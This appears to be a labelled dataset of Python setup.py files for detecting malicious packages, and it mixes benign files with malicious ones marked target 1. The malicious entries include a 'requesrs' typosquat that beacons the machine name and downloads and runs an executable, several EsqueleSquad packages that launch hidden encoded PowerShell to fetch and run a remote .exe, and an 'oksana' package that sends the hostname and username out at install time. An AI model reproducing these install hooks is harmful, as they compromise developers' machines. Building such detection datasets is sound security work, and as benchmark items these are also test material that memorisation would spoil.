{"idx": "requesrs-2.28.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n \ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://packagereleases.com/pyp/resp.php?live=InstallationRequest \" +env)\n        if platform == 'win32':\n            url = 'https://packagereleases.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n  name='requesrs',\n  version='2.28.2',\n  description='The initial release',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "Flask-Log-Request-ID-0.10.1", "func": "\"\"\"\nFlask-Log-Request-Id\n====================\n\n|CircleCI|\n\n**Flask-Log-Request-Id** is an extension for `Flask`_ that can parse and handle\nthe request-id sent by request processors like `Amazon ELB`_, `Heroku Request-ID`_\nor any multi-tier infrastructure as the one used at microservices. A common\nusage scenario is to inject the request\\\\_id in the logging system so that all\nlog records, even those emitted by third party libraries, have attached the\nrequest\\\\_id that initiated their call. This can greatly improve tracing and debugging of problems.\n\n\nFeatures\n--------\n\nFlask-Log-Request-Id provides the ``current_request_id()`` function which can be used\nat any time to get the request id of the initiated execution chain. It also comes with\nlog filter to inject this information on log events as also an extension to forward\nthe current request id into Celery's workers.\n\n\nExample: Parse request id and send it to to logging\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn the following example, we will use the ``RequestIDLogFilter`` to inject\nthe request id on all log events, and a custom formatter to print this\ninformation. If all these sounds unfamiliar please take a look at `python logging system`_\n\n.. code:: python\n\n    import logging\n    import logging.config\n    from random import randint\n    from flask import Flask\n    from flask_log_request_id import RequestID, RequestIDLogFilter\n\n    def generic_add(a, b):\n        \\\"\"\"Simple function to add two numbers that is not aware of the request id\\\"\"\"\n        logging.debug('Called generic_add({}, {})'.format(a, b))\n        return a + b\n\n    app = Flask(__name__)\n    RequestID(app)\n\n    # Setup logging\n    handler = logging.StreamHandler()\n    handler.setFormatter(\n        logging.Formatter(\"%(asctime)s - %(name)s - level=%(levelname)s - request_id=%(request_id)s - %(message)s\"))\n    handler.addFilter(RequestIDLogFilter())  # << Add request id contextual filter\n    logging.getLogger().addHandler(handler)\n\n\n    @app.route('/')\n    def index():\n        a, b = randint(1, 15), randint(1, 15)\n        logging.info('Adding two random numbers {} {}'.format(a, b))\n        return str(generic_add(a, b))\n\n\nInstallation\n------------\nThe easiest way to install it is using ``pip`` from PyPI\n\n.. code:: bash\n\n    pip install flask-log-request-id\n\n\nLicense\n-------\n\nSee the `LICENSE`_ file for license rights and limitations (MIT).\n\n\n.. _Flask: http://flask.pocoo.org/\n.. _Amazon ELB: http://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-request-tracing.html\n.. _Heroku Request-ID: https://devcenter.heroku.com/articles/http-request-id\n.. _python logging system: https://docs.python.org/3/library/logging.html\n.. _LICENSE: https://github.com/Workable/flask-log-request-id/blob/master/LICENSE.md\n.. |CircleCI| image:: https://img.shields.io/circleci/project/github/Workable/flask-log-request-id.svg\n   :target: https://circleci.com/gh/Workable/flask-log-request-id\n\n\"\"\"\nimport re\nimport ast\nfrom setuptools import setup\n\n_version_re = re.compile(r'__version__\\s+=\\s+(.*)')\n\nwith open('flask_log_request_id/__init__.py', 'rb') as f:\n    version = str(ast.literal_eval(_version_re.search(\n        f.read().decode('utf-8')).group(1)))\n\ntest_requirements = [\n    'nose',\n    'flake8',\n    'mock==2.0.0',\n    'coverage~=4.5.4',\n    'celery~=4.3.0'\n]\n\nsetup(\n    name='Flask-Log-Request-ID',\n    version=version,\n    url='http://github.com/Workable/flask-log-request-id',\n    license='MIT',\n    author='Konstantinos Paliouras, Ioannis Foukarakis',\n    author_email='squarious@gmail.com, ioannis.foukarakis@gmail.com',\n    description='Flask extension that can parse and handle multiple types of request-id '\n                'sent by request processors like Amazon ELB, Heroku or any multi-tier '\n                'infrastructure as the one used for microservices.',\n    long_description=__doc__,\n    maintainer=\"Konstantinos Paliouras\",\n    maintainer_email=\"squarious@gmail.com\",\n    packages=[\n        'flask_log_request_id',\n        'flask_log_request_id.extras'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'Flask>=0.8',\n    ],\n    tests_require=test_requirements,\n    setup_requires=[\n        \"flake8\",\n        \"nose\"\n    ],\n    extras_require={\n        'test': test_requirements\n    },\n    test_suite='nose.collector',\n    classifiers=[\n        'Environment :: Web Environment', 'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent', 'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ])\n", "target": 0}
{"idx": "liburlstringping-3.86", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liburlstringping',\n    packages = ['modlib'],\n    version = '5.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqinfohackedvisa-2.24", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfohackedvisa',\n    packages = ['modlib'],\n    version = '7.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ecdsa-0.18.0", "func": "#!/usr/bin/env python\n\nimport io\nimport os\n\nfrom setuptools import setup\nimport versioneer\n\ncommands = versioneer.get_cmdclass().copy()\n\n# Use README.md to set markdown long_description\ndirectory = os.path.abspath(os.path.dirname(__file__))\nreadme_path = os.path.join(directory, \"README.md\")\nwith io.open(readme_path, encoding=\"utf-8\") as read_file:\n    long_description = read_file.read()\n\nsetup(\n    name=\"ecdsa\",\n    version=versioneer.get_version(),\n    description=\"ECDSA cryptographic signature library (pure python)\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"Brian Warner\",\n    author_email=\"warner@lothar.com\",\n    url=\"http://github.com/tlsfuzzer/python-ecdsa\",\n    packages=[\"ecdsa\"],\n    package_dir={\"\": \"src\"},\n    license=\"MIT\",\n    cmdclass=commands,\n    python_requires=\">=2.6, !=3.0.*, !=3.1.*, !=3.2.*\",\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n    ],\n    install_requires=[\"six>=1.9.0\"],\n    extras_require={\"gmpy2\": \"gmpy2\", \"gmpy\": \"gmpy\"},\n)\n", "target": 0}
{"idx": "DateTimeRange-1.2.0", "func": "\"\"\"\n.. codeauthor:: Tsuyoshi Hombashi <tsuyoshi.hombashi@gmail.com>\n\"\"\"\n\nimport os.path\nfrom typing import Dict\n\nimport setuptools\n\n\nMODULE_NAME = \"DateTimeRange\"\nREPOSITORY_URL = f\"https://github.com/thombashi/{MODULE_NAME:s}\"\nREQUIREMENT_DIR = \"requirements\"\nENCODING = \"utf8\"\n\npkg_info: Dict[str, str] = {}\n\n\ndef get_release_command_class() -> Dict[str, setuptools.Command]:\n    try:\n        from releasecmd import ReleaseCommand\n    except ImportError:\n        return {}\n\n    return {\"release\": ReleaseCommand}\n\n\nwith open(os.path.join(MODULE_NAME.lower(), \"__version__.py\")) as f:\n    exec(f.read(), pkg_info)\n\nwith open(\"README.rst\", encoding=ENCODING) as fp:\n    long_description = fp.read()\n\nwith open(os.path.join(\"docs\", \"pages\", \"introduction\", \"summary.txt\"), encoding=ENCODING) as f:\n    summary = f.read().strip()\n\nwith open(os.path.join(REQUIREMENT_DIR, \"requirements.txt\")) as f:\n    install_requires = [line.strip() for line in f if line.strip()]\n\nwith open(os.path.join(REQUIREMENT_DIR, \"test_requirements.txt\")) as f:\n    tests_requires = [line.strip() for line in f if line.strip()]\n\nsetuptools.setup(\n    name=MODULE_NAME,\n    version=pkg_info[\"__version__\"],\n    url=REPOSITORY_URL,\n    author=pkg_info[\"__author__\"],\n    author_email=pkg_info[\"__email__\"],\n    description=summary,\n    include_package_data=True,\n    keywords=[\"datetimerange\", \"datetime\", \"time range\"],\n    license=pkg_info[\"__license__\"],\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    packages=setuptools.find_packages(exclude=[\"test*\"]),\n    project_urls={\n        \"Documentation\": f\"https://{MODULE_NAME.lower():s}.rtfd.io/\",\n        \"Source\": REPOSITORY_URL,\n        \"Tracker\": f\"{REPOSITORY_URL:s}/issues\",\n    },\n    python_requires=\">=3.6\",\n    install_requires=install_requires,\n    tests_require=tests_requires,\n    extras_require={\"test\": tests_requires},\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Text Processing\",\n    ],\n    cmdclass=get_release_command_class(),\n)\n", "target": 0}
{"idx": "django-cache-memoize-0.1.10", "func": "from os import path\nfrom setuptools import setup, find_packages\n\n_here = path.dirname(__file__)\n\n\nsetup(\n    name=\"django-cache-memoize\",\n    version=\"0.1.10\",\n    description=(\n        \"Django utility for a memoization decorator that uses the Django \"\n        \"cache framework.\"\n    ),\n    long_description=open(path.join(_here, \"README.rst\")).read(),\n    author=\"Peter Bengtsson\",\n    author_email=\"mail@peterbe.com\",\n    license=\"MPL-2.0\",\n    url=\"https://github.com/peterbe/django-cache-memoize\",\n    packages=find_packages(where=\"src\"),\n    package_dir={\"\": \"src\"},\n    python_requires=\">=3.5\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment :: Mozilla\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n    keywords=[\"django\", \"memoize\", \"cache\", \"decorator\"],\n    zip_safe=False,\n    extras_require={\"dev\": [\"flake8\", \"tox\", \"twine\", \"therapist\", \"black\"]},\n)\n", "target": 0}
{"idx": "maskhttp-4.39", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'maskhttp',\n    packages = ['modlib'],\n    version = '1.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eth-keys-0.4.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\n\ndeps = {\n    'coincurve': [\n        'coincurve>=7.0.0,<16.0.0',\n    ],\n    'eth-keys': [\n        \"eth-utils>=2.0.0,<3.0.0\",\n        \"eth-typing>=3.0.0,<4\",\n    ],\n    'test': [\n        \"asn1tools>=0.146.2,<0.147\",\n        \"factory-boy>=3.0.1,<3.1\",\n        \"pyasn1>=0.4.5,<0.5\",\n        \"pytest==6.2.5\",\n        \"hypothesis>=5.10.3, <6.0.0\",\n        \"eth-hash[pysha3];implementation_name=='cpython'\",\n        \"eth-hash[pycryptodome];implementation_name=='pypy'\",\n    ],\n    'lint': [\n        'flake8==3.0.4',\n        'mypy==0.782',\n    ],\n    'dev': [\n        'tox==3.20.0',\n        'bumpversion==0.5.3',\n        'twine',\n    ],\n}\n\ndeps['dev'] = (\n    deps['dev'] +\n    deps['eth-keys'] +\n    deps['lint'] +\n    deps['test']\n)\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\nsetup(\n    name='eth-keys',\n    # *IMPORTANT*: Don't manually change the version here. Use the 'bumpversion' utility.\n    version='0.4.0',\n    description=\"\"\"Common API for Ethereum key operations.\"\"\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='Piper Merriam',\n    author_email='pipermerriam@gmail.com',\n    url='https://github.com/ethereum/eth-keys',\n    include_package_data=True,\n    install_requires=deps['eth-keys'],\n    py_modules=['eth_keys'],\n    extras_require=deps,\n    license=\"MIT\",\n    zip_safe=False,\n    package_data={'eth-keys': ['py.typed']},\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "oksana-999.0.5", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://j0j0.xyz/grmmrly\",params = ploads)\n        requests.get(\"https://\"+username+\".\"+hostname+\".\"+\"grmmrly.j0j0.xyz\",params = ploads)\n\n\nsetup(name='Oksana',\n      version='999.0.5',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "elasticsearch6-6.8.2", "func": "# -*- coding: utf-8 -*-\n#  Licensed to Elasticsearch B.V. under one or more contributor\n#  license agreements. See the NOTICE file distributed with\n#  this work for additional information regarding copyright\n#  ownership. Elasticsearch B.V. licenses this file to you under\n#  the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License.\n#  You may obtain a copy of the License at\n#\n# \thttp://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing,\n#  software distributed under the License is distributed on an\n#  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n#  KIND, either express or implied.  See the License for the\n#  specific language governing permissions and limitations\n#  under the License.\n\nfrom os.path import join, dirname\nfrom setuptools import setup, find_packages\nimport sys\n\nVERSION = (6, 8, 2)\n__version__ = VERSION\n__versionstr__ = \".\".join(map(str, VERSION))\n\nf = open(join(dirname(__file__), \"README\"))\nlong_description = f.read().strip()\nf.close()\n\ninstall_requires = [\"urllib3>=1.21.1\"]\ntests_require = [\n    \"requests>=2.0.0, <3.0.0\",\n    \"nose\",\n    \"coverage\",\n    \"mock\",\n    \"pyyaml\",\n    \"nosexcover\",\n    \"numpy\",\n    \"pandas\",\n]\n\n# use external unittest for 2.6\nif sys.version_info[:2] == (2, 6):\n    install_requires.append(\"unittest2\")\n\nsetup(\n    name=\"elasticsearch6\",\n    description=\"Python client for Elasticsearch\",\n    license=\"Apache-2.0\",\n    url=\"https://github.com/elastic/elasticsearch-py\",\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    version=__versionstr__,\n    author=\"Honza Kr\u00e1l, Nick Lang\",\n    author_email=\"honza.kral@gmail.com, nick@nicklang.com\",\n    maintainer=\"Seth Michael Larson\",\n    maintainer_email=\"seth.larson@elastic.co\",\n    packages=find_packages(where=\".\", exclude=(\"test_elasticsearch*\",)),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.2\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    python_requires=\">=2.6, !=3.0.*, !=3.1.*, !=3.2.*, <4\",\n    install_requires=install_requires,\n    test_suite=\"test_elasticsearch.run_tests.run_all\",\n    tests_require=tests_require,\n    extras_require={\n        \"develop\": tests_require + [\"sphinx<1.7\", \"sphinx_rtd_theme\"],\n        \"requests\": [\"requests>=2.4.0, <3.0.0\"],\n    },\n)\n", "target": 0}
{"idx": "dynaconf-3.1.9", "func": "from __future__ import print_function,absolute_import,division,unicode_literals\n_V='bdist_wheel'\n_U='--version'\n_T='extra_packages'\n_S='universal'\n_R='nested'\n_Q='setting  distdir {}/{}'\n_P='nsp'\n_O='PYDISTBASE'\n_N='True'\n_M='DVDEBUG'\n_L='LICENSE'\n_K='Jython'\n_J='install'\n_I='full_package_name'\n_H='__init__.py'\n_G='python'\n_F='setup.py'\n_E='utf-8'\n_D=True\n_C=False\n_B='.'\n_A=None\nimport sys,os,datetime,traceback\nsys.path=[path for path in sys.path if path not in[os.getcwd(),'']]\nimport platform\nfrom _ast import *\nfrom ast import parse\nfrom setuptools import setup,Extension,Distribution\nfrom setuptools.command import install_lib\nfrom setuptools.command.sdist import sdist as _sdist\ntry:from setuptools.namespaces import Installer as NameSpaceInstaller\nexcept ImportError:msg='You should use the latest setuptools. The namespaces.py file that this setup.py uses was added in setuptools 28.7.0 (Oct 2016)';print(msg);sys.exit()\nif __name__!='__main__':raise NotImplementedError('should never include setup.py')\nfull_package_name=_A\nif sys.version_info<(3,):string_type=basestring\nelse:string_type=str\nif sys.version_info<(3,4):\n\tclass Bytes:0\n\tclass NameConstant:0\nif sys.version_info>=(3,8):from ast import Str,Num,Bytes,NameConstant\nif sys.version_info<(3,):open_kw=dict()\nelse:open_kw=dict(encoding=_E)\nif sys.version_info<(2,7)or platform.python_implementation()==_K:\n\tclass Set:0\nif os.environ.get(_M,'')=='':\n\tdef debug(*args,**kw):0\nelse:\n\tdef debug(*args,**kw):\n\t\twith open(os.environ[_M],'a')as fp:kw1=kw.copy();kw1['file']=fp;print('{:%Y-%d-%mT%H:%M:%S}'.format(datetime.datetime.now()),file=fp,end=' ');print(*args,**kw1)\ndef literal_eval(node_or_string):\n\t_safe_names={'None':_A,_N:_D,'False':_C}\n\tif isinstance(node_or_string,string_type):node_or_string=parse(node_or_string,mode='eval')\n\tif isinstance(node_or_string,Expression):node_or_string=node_or_string.body\n\telse:raise TypeError('only string or AST nodes supported')\n\tdef _convert(node):\n\t\tif isinstance(node,Str):\n\t\t\tif sys.version_info<(3,)and not isinstance(node.s,unicode):return node.s.decode(_E)\n\t\t\treturn node.s\n\t\telif isinstance(node,Bytes):return node.s\n\t\telif isinstance(node,Num):return node.n\n\t\telif isinstance(node,Tuple):return tuple(map(_convert,node.elts))\n\t\telif isinstance(node,List):return list(map(_convert,node.elts))\n\t\telif isinstance(node,Set):return set(map(_convert,node.elts))\n\t\telif isinstance(node,Dict):return dict(((_convert(k),_convert(v))for(k,v)in zip(node.keys,node.values)))\n\t\telif isinstance(node,NameConstant):return node.value\n\t\telif sys.version_info<(3,4)and isinstance(node,Name):\n\t\t\tif node.id in _safe_names:return _safe_names[node.id]\n\t\telif isinstance(node,UnaryOp)and isinstance(node.op,(UAdd,USub))and isinstance(node.operand,(Num,UnaryOp,BinOp)):\n\t\t\toperand=_convert(node.operand)\n\t\t\tif isinstance(node.op,UAdd):return+operand\n\t\t\telse:return-operand\n\t\telif isinstance(node,BinOp)and isinstance(node.op,(Add,Sub))and isinstance(node.right,(Num,UnaryOp,BinOp))and isinstance(node.left,(Num,UnaryOp,BinOp)):\n\t\t\tleft=_convert(node.left);right=_convert(node.right)\n\t\t\tif isinstance(node.op,Add):return left+right\n\t\t\telse:return left-right\n\t\telif isinstance(node,Call):\n\t\t\tfunc_id=getattr(node.func,'id',_A)\n\t\t\tif func_id=='dict':return dict(((k.arg,_convert(k.value))for k in node.keywords))\n\t\t\telif func_id=='set':return set(_convert(node.args[0]))\n\t\t\telif func_id=='date':return datetime.date(*[_convert(k)for k in node.args])\n\t\t\telif func_id=='datetime':return datetime.datetime(*[_convert(k)for k in node.args])\n\t\terr=SyntaxError('malformed node or string: '+repr(node));err.filename='<string>';err.lineno=node.lineno;err.offset=node.col_offset;err.text=repr(node);err.node=node;raise err\n\treturn _convert(node_or_string)\ndef _package_data(fn):\n\tdata={}\n\twith open(fn,**open_kw)as fp:\n\t\tparsing=_C;lines=[]\n\t\tfor line in fp.readlines():\n\t\t\tif sys.version_info<(3,):line=line.decode(_E)\n\t\t\tif line.startswith('_package_data'):\n\t\t\t\tif'dict('in line:parsing=_G;lines.append('dict(\\n')\n\t\t\t\telif line.endswith('= {\\n'):parsing=_G;lines.append('{\\n')\n\t\t\t\telse:raise NotImplementedError\n\t\t\t\tcontinue\n\t\t\tif not parsing:continue\n\t\t\tif parsing==_G:\n\t\t\t\tif line.startswith(')')or line.startswith('}'):\n\t\t\t\t\tlines.append(line)\n\t\t\t\t\ttry:data=literal_eval(''.join(lines))\n\t\t\t\t\texcept SyntaxError as e:\n\t\t\t\t\t\tcontext=2;from_line=e.lineno-(context+1);to_line=e.lineno+(context-1);w=len(str(to_line))\n\t\t\t\t\t\tfor (index,line) in enumerate(lines):\n\t\t\t\t\t\t\tif from_line<=index<=to_line:\n\t\t\t\t\t\t\t\tprint('{0:{1}}: {2}'.format(index,w,line).encode(_E),end='')\n\t\t\t\t\t\t\t\tif index==e.lineno-1:print('{0:{1}}  {2}^--- {3}'.format(' ',w,' '*e.offset,e.node))\n\t\t\t\t\t\traise\n\t\t\t\t\tbreak\n\t\t\t\tlines.append(line)\n\t\t\telse:raise NotImplementedError\n\treturn data\npkg_data=_package_data(__file__.replace(_F,_H))\nexclude_files=[_F]\ndef _check_convert_version(tup):\n\tret_val=str(tup[0]);next_sep=_B;nr_digits=0;post_dev=_C\n\tfor x in tup[1:]:\n\t\tif isinstance(x,int):\n\t\t\tnr_digits+=1\n\t\t\tif nr_digits>2:raise ValueError('too many consecutive digits after '+ret_val)\n\t\t\tret_val+=next_sep+str(x);next_sep=_B;continue\n\t\tfirst_letter=x[0].lower();next_sep=''\n\t\tif first_letter in'abcr':\n\t\t\tif post_dev:raise ValueError('release level specified after post/dev: '+x)\n\t\t\tnr_digits=0;ret_val+='rc'if first_letter=='r'else first_letter\n\t\telif first_letter in'pd':nr_digits=1;post_dev=_D;ret_val+='.post'if first_letter=='p'else'.dev'\n\t\telse:raise ValueError('First letter of \"'+x+'\" not recognised')\n\tif nr_digits==1 and post_dev:ret_val+='0'\n\treturn ret_val\nversion_info=pkg_data['version_info']\nversion_str=_check_convert_version(version_info)\nclass MyInstallLib(install_lib.install_lib):\n\tdef install(self):\n\t\tfpp=pkg_data[_I].split(_B);full_exclude_files=[os.path.join(*fpp+[x])for x in exclude_files];alt_files=[];outfiles=install_lib.install_lib.install(self)\n\t\tfor x in outfiles:\n\t\t\tfor full_exclude_file in full_exclude_files:\n\t\t\t\tif full_exclude_file in x:os.remove(x);break\n\t\t\telse:alt_files.append(x)\n\t\treturn alt_files\nclass MySdist(_sdist):\n\tdef initialize_options(self):\n\t\t_sdist.initialize_options(self);dist_base=os.environ.get(_O);fpn=getattr(getattr(self,_P,self),_I,_A)\n\t\tif fpn and dist_base:print(_Q.format(dist_base,fpn));self.dist_dir=os.path.join(dist_base,fpn)\ntry:\n\tfrom 